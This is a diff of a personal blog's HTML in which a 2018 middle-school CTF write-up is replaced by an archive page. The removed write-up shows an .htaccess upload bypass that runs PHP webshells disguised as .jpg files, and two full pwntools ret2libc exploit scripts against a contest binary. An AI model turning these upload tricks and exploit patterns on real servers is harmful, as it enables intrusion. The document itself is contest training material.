@@ -12,7 +12,7 @@
     
     <title>
         
-            全国中学生网络安全技术大赛-Writeup | 
+            归档: 2018 | 
         
         iosmosis&#39;s blog
     </title>
@@ -36,7 +36,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="iosmosis">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="null,writeup,WEB,msscstc,PWN,MISC,西电网安杯">
+    <meta name="keywords" content="null">
 
     <!-- Site Verification -->
     
@@ -65,18 +65,15 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://iosmosis.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="全国中学生网络安全技术大赛-Writeup | iosmosis&#39;s blog">
+    <meta property="og:title" content="归档: 2018 | iosmosis&#39;s blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="writeup"> <meta property="og:article:tag" content="WEB"> <meta property="og:article:tag" content="msscstc"> <meta property="og:article:tag" content="PWN"> <meta property="og:article:tag" content="MISC"> <meta property="og:article:tag" content="西电网安杯"> 
-
     
-        <meta property="article:published_time" content="6月 12, 2018" />
-        <meta property="article:modified_time" content="6月 12, 2018" />
+
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="全国中学生网络安全技术大赛-Writeup | iosmosis&#39;s blog">
+    <meta name="twitter:title" content="归档: 2018 | iosmosis&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -84,43 +81,13 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://iosmosis.github.io/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/index.html" />
+        <link rel="canonical" href="http://iosmosis.github.io/archives/2018/page/3/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
-
-<script type="application/ld+json">
-{
-    "@context": "https://schema.org",
-    "@type": "Article",
-    "publisher": {
-        "@type": "Organization",
-        "name": "iosmosis&#39;s blog",
-        "logo": "/img/favicon.png"
-    },
-    "author": {
-        "@type": "Person",
-        "name": "iosmosis",
-        "image": {
-            "@type": "ImageObject",
-            "url": "/img/favicon.png"
-        },
-        "description": "期待大学生活的二进制菜鸡"
-    },
-    "headline": "全国中学生网络安全技术大赛-Writeup",
-    "url": "http://iosmosis.github.io/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/index.html",
-    "datePublished": "6月 12, 2018",
-    "dateModified": "6月 12, 2018",
-    "description": "",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "http://iosmosis.github.io"
-    }
-}
-</script>
 
 
     
@@ -316,324 +283,104 @@
                         </button>
                     
 
-                    <!-- Post TOC -->
-
+                    <!-- Index Module -->
+<div class="material-index mdl-grid">
     
-    <!-- Back Button -->
-    <!--
-    <div class="material-back" id="backhome-div" tabindex="0">
-        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
-           href="#" onclick="window.history.back();return false;"
-           target="_self"
-           role="button"
-           data-upgraded=",MaterialButton,MaterialRipple">
-            <i class="material-icons" role="presentation">arrow_back</i>
-            <span class="mdl-button__ripple-container">
-                <span class="mdl-ripple"></span>
-            </span>
-        </a>
-    </div>
-    -->
+    <div class="locate-thumbnail-symbol"></div>
 
-    <!-- Left aligned menu below button -->
-    <button id="post-toc-trigger-btn"
-        class="mdl-button mdl-js-button mdl-button--icon">
-        <i class="material-icons">format_list_numbered</i>
-    </button>
-
-    
-    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">1.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#签到题"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">签到题</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">2.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#baby-upload"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">baby upload</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">3.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ez-pwn"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">ez_pwn</span></a></li></ol></li></ol>
-        <!--
-        <li class="mdl-menu__item">
-            Some Action
-        </li>
-        -->
-    </ul>
+    <!-- Pin on top -->
     
 
-
-
-
-
-<!-- Layouts -->
-
-    <!-- Post Module -->
-    <div class="material-post_container">
-
-        <div class="material-post mdl-grid">
-            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
-
-                <!-- Post Header(Thumbnail & Title) -->
-                
-    <!-- Paradox Post Header -->
+    <!-- Normal Post -->
+    
+        
+            
+                <!-- Paradox Thumbnail -->
+                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
+    <!-- Post Thumbnail -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-            <script type="text/ls-javascript" id="post-thumbnail-script">
-    var randomNum = Math.floor(Math.random() * 19 + 1);
-
-    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
-    $('.post_thumbnail-random').addClass('lazy');
-</script>
-
         
     
-            <p class="article-headline-p">
-                全国中学生网络安全技术大赛-Writeup
-            </p>
-        </div>
 
-
-
-
-
-                
-                    <!-- Paradox Post Info -->
-                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
-
-    <!-- Author Avatar -->
-    <div id="author-avatar">
-        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
-    </div>
-    <!-- Author Name & Date -->
-    <div>
-        <strong>iosmosis</strong>
-        <span>6月 12, 2018</span>
+        <!-- Post Title -->
+        <p class="article-headline-p"><a href="/2018/03/20/hexofix/">关于hexo添加图片的问题</a></p>
     </div>
 
-    <div class="section-spacer"></div>
-
-    <!-- Favorite -->
-    <!--
-        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
-            <i class="material-icons" role="presentation">favorite</i>
-            <span class="visuallyhidden">favorites</span>
-        </button>
-    -->
-
-    <!-- Qrcode -->
-    
-        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-    <i class="material-icons" role="presentation">devices other</i>
-    <span class="visuallyhidden">devices other</span>
-</button>
-<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
-    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
-    
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAAE+CAAAAAAxUyPsAAAEy0lEQVR42u3awW4bMQwEUP//T6fXAoWdGZJO0vbpFCTr3dWTgVBDPT6MxXggwIcPHz4DHz58+Ax8+P4Svkc86sf88ankzu2b/P6b1399dn39RHz48OHDh2/N10Ikr9KSbZ717A75lcWXAB8+fPjw4Tviy1/o9cOSAmJW7rx+n7wkms0dHz58+PDh+16+NkqYlSxJQbMPFPDhw4cPH76fzJdMJgnEZ6H5pgzChw8fPnz4fg5f/pg8Cs/b4fuipC2wvqHXgQ8fPnz48C2Khn/j5y8934cPHz58+P57vna0TejXv28Li9ujZkMBfPjw4cOHb8HXBusJ4iy4b0cSW+QLmUQY+PDhw4cP3xVfW17kn9ofa8sLqX1YH80FHz58+PDhW/AloUBSCmwOt7XLcHVArW3b48OHDx8+fHu+vMhoD5m1G/LZYbVPphovVRFA4MOHDx8+fGu+NhrI/3p7n7x8SRZj9hR8+PDhw4fviq8laKOB19OYNcg3y5M0zodtcnz48OHDh6+MDPJpzJYhD9Zn7flZC39YuODDhw8fPnwLvtlNZ43qTbnTBu5tgfL064UPHz58+PAt+PIXyhvns7Z6/lZtGJFHHvUBNXz48OHDh6/kS7bZOXQePWyKnk2roP09Pnz48OHD9w6+HLGNv/PW++z6Gf0mwsCHDx8+fPg2fJtNdTv5NoBIpteGDm3EECUu+PDhw4cP34hvVl7kU7o9WLYvg2bo+PDhw4cP354vL0SS62cxxP5oWt7w3rTw8eHDhw8fvg3fbUBwFUDMGup582DzdHz48OHDh2/D10bh+Zb+YHO+OB5XR/BB+YUPHz58+PDd8s2i+ba8aH/Og4mWL/+64MOHDx8+fFd872hL15vwuCUwe9aQKSlc8OHDhw8fvhHfLMhuoROa5P6b1sK+SYAPHz58+PBt+PIDarNSZnYsbN/qzqFXB9Tw4cOHDx++UeGy35DnE2hb5u0k269CveT48OHDhw/fgq9tlu83+W0cMDvu1j4xfxY+fPjw4cO350vKhfwQ2OxQ2r4c2XwVkiIMHz58+PDhu+LbRO2zID5nmi3krA1QH1DDhw8fPnz4RnxJa7mdXtv2ToqPTQwxm10dGeDDhw8fPnxrvvwffD6BWfGxKZ42AT0+fPjw4cN3xddus5MioA0dkutnxVMb+kfQ+PDhw4cP34LvtgS5bYS/71BaPvDhw4cPH7538OVHuGbN9bwYysuUq3er2wz48OHDhw/fEV8eys/gZhDtp/J7DkMEfPjw4cOH75RvVpQkr76ZWBv9twfpipACHz58+PDhO+JrI/Jh2F022jeLtGm948OHDx8+fO/gu2pgt5vwNkTYl1bts6LIAB8+fPjw4Sv5Nge22gD9qo3dFkn7ZcCHDx8+fPiu+GYN7FmTOw8Rkis3y5zHB/jw4cOHD987+NpX+Tgdsw1/XXBctefx4cOHDx++I779ca48yr8qm9pSaRbf48OHDx8+fN/Ltw/i28+27fDZ4kXvhg8fPnz48H05Xx7Tt5vzq+B+tnjJguHDhw8fPnxXfPvH3Ebq+1Bg1mL/ZO748OHDhw/fmi+PrZPXmm3R8yb9rCneLkxRuODDhw8fPnwxn1GXMgjw4cOHz8CHDx8+Ax++nzt+AfkF6UeG+U46AAAAAElFTkSuQmCC">
-    
-</ul>
-    
-
-    <!-- Tags (bookmark) -->
-    
-    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-        <i class="material-icons" role="presentation">bookmark</i>
-        <span class="visuallyhidden">bookmark</span>
-    </button>
-    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
-        <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/MISC/">MISC</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/PWN/">PWN</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/WEB/">WEB</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/msscstc/">msscstc</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/writeup/">writeup</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/西电网安杯/">西电网安杯</a>
-    </ul>
-    
-
-    <!-- Share -->
-    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-    <i class="material-icons" role="presentation">share</i>
-    <span class="visuallyhidden">share</span>
-</button>
-<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
-    
-
-    
-
-    <!-- Share Weibo -->
-    
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=全国中学生网络安全技术大赛-Writeup&url=http://iosmosis.github.io/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/index.html&pic=&searchPic=false&style=simple" target="_blank">
-            <li class="mdl-menu__item">
-                分享到微博
-            </li>
-        </a>
-    
-
-    <!-- Share Twitter -->
-    
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=全国中学生网络安全技术大赛-Writeup&url=http://iosmosis.github.io/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/index.html&via=iosmosis" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 Twitter
-            </li>
-        </a>
-    
-
-    <!-- Share Facebook -->
-    
-
-    <!-- Share Google+ -->
-    
-
-    <!-- Share LinkedIn -->
-    
-
-    <!-- Share QQ -->
-    
-
-    <!-- Share Telegram -->
-    
-</ul>
-
-</div>
-
-                
-
-                <!-- Post Content -->
-                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
-    
-        <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开题目得到flag</p>
-<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre><code>Welcome
-121
-Welcome to msscstc!
-
-This is your flag: flag{4f403810354870e07cb00b549cf577c9}
-
-good luck &amp;&amp; have fun!
-</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h2><p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/1.jpg" alt="ida1"><br>测试了没被禁用的上传点 发现上传没有任何反应 发现第三个禁用了 所以通过审查元素更改<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/2.jpg" alt="ida1"><br>根据hint提示 了解到 .htaccesss</p>
-<p>上传当前目录的.htaccess 文件</p>
-<p>例如内容为： AddType application/x-http-php .jpg   (上传的jpg 均以php执行)</p>
-<p>把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件</p>
-<p>所以构造上传<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/3.jpg" alt="ida1"></p>
-<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/4.jpg" alt="ida1"><br>这里修改为.htaccess 放行<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/5.jpg" alt="ida1"></p>
-<p>成功覆盖<br>接着上传jpg的小马 或者一句话<br>尝试传小马貌似有问题 这里改用post<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/6.jpg" alt="ida1"></p>
-<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/7.jpg" alt="ida1"><br>尝试一句话<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/8.jpg" alt="ida1"><br>尝试上传<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/9.jpg" alt="ida1"><br>成功解析<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/10.jpg" alt="ida1"></p>
-<p>执行find 找到flag目录<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/11.jpg" alt="ida1"><br>cat 得到flag<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/12.jpg" alt="ida1"></p>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>这里感谢一波出题人 放出了libc<br>载入ida分析</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">sub_804857B</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>
-
-  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>之前利用思路 a*buffer+jmp esp+shellcode</p>
-<p>But..</p>
-<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/13.jpg" alt="ida1"><br>NX开启 RELRO开启<br>所以 直接写shellcode就没办法了 </p>
-<p>通过leak puts_addr 找到 system binsh 的真实地址</p>
-<p>Leak通过 sub_804857B() 构造循环<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/14.jpg" alt="ida1"></p>
-<p>本地EXP</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
-<span class="token comment" spellcheck="true"># coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#p = remote('45.40.195.20',23333)</span>
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> <span class="token operator">//</span>本地libc
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">//</span>leak puts_addr
-puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804857b</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'puts addr = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span> 
-puts_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-system<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-binsh<span class="token operator">=</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-system<span class="token operator">=</span>system<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
-binsh<span class="token operator">=</span>binsh<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>由于之前提供错了libc 自己远程recv也写错了2333<br>北邮面试完回来修改得到<br>远程EXP</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
-<span class="token comment" spellcheck="true"># coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-<span class="token comment" spellcheck="true">#p=process('./pwn1')</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'45.40.195.20'</span><span class="token punctuation">,</span><span class="token number">23333</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span><span class="token punctuation">)</span>
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804857b</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token operator">//</span>多加了这里
-puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'puts addr = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
-puts_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-system<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-binsh<span class="token operator">=</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-system<span class="token operator">=</span>system<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
-binsh<span class="token operator">=</span>binsh<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>得到flag<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/15.jpg" alt="ida1"></p>
-
-    
-
-    
-</div>
+    <!-- Post Excerpt -->
+    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
+        
+            解决了关于hexo文章内部引用图片的问题
+找到你建立的hexo网站的主页配置文件 “_config.yml”
 
 
-                
-
-                <!-- Post Comments -->
-                
-                    
-                
+        
+        &nbsp;&nbsp;&nbsp;
+        <span>
+            <a href="/2018/03/20/hexofix/" target="_self">阅读全文</a>
+        </span>
+    </div>
+    <!-- Post_entry Info-->
+    <div id="post_entry-info">
+        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
+            <!-- Author Avatar -->
+            <div id="author-avatar">
+                <img src="/img/avatar.png" width="44px" height="44px" alt="iosmosis's avatar">
             </div>
+            <div>
+                <strong>iosmosis</strong>
+                <span>3月 20, 2018</span>
+            </div>
+        </div>
+        <div id="post_entry-right-info">
+            <!-- Category -->
+            <span class="post_entry-category">
+                
+            </span>
 
-            <!-- Post Prev & Next Nav -->
-            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-    <!-- Prev Nav -->
-    
-        <a href="/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
+            
 
-    <!-- Section Spacer -->
-    <div class="section-spacer"></div>
+            
 
-    <!-- Next Nav -->
-    
-        <a href="/2018/06/18/bamboofox-ret2syscall/" id="post_nav-older" class="next-content">
-            旧篇
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_forward</i>
-            </button>
-        </a>
-    
-</nav>
-
+            <!-- Post Views -->
+            <span class="post_entry-views">
+            </span>
         </div>
     </div>
+</div>
 
+            
+            
+        
+    
+
+    
+    <!-- Index nav -->
+        <nav class="material-nav mdl-cell mdl-cell--12-col">
+            <a class="extend prev" rel="prev" href="/archives/2018/page/2/"><button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"><i class="material-icons" role="presentation">arrow_back</i></button></a><a class="page-number" href="/archives/2018/">1</a><a class="page-number" href="/archives/2018/page/2/">2</a><span class="page-number current">3</span>
+        </nav>
+    
+
+    
+        <script type="text/ls-javascript" id="thumbnail-script">
+    var randomNum;
+
+    var locatePost = $('.locate-thumbnail-symbol').next();
+    for(var i = 0; i < 10; i++) {
+        randomNum = Math.floor(Math.random() * 19 + 1);
+
+        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
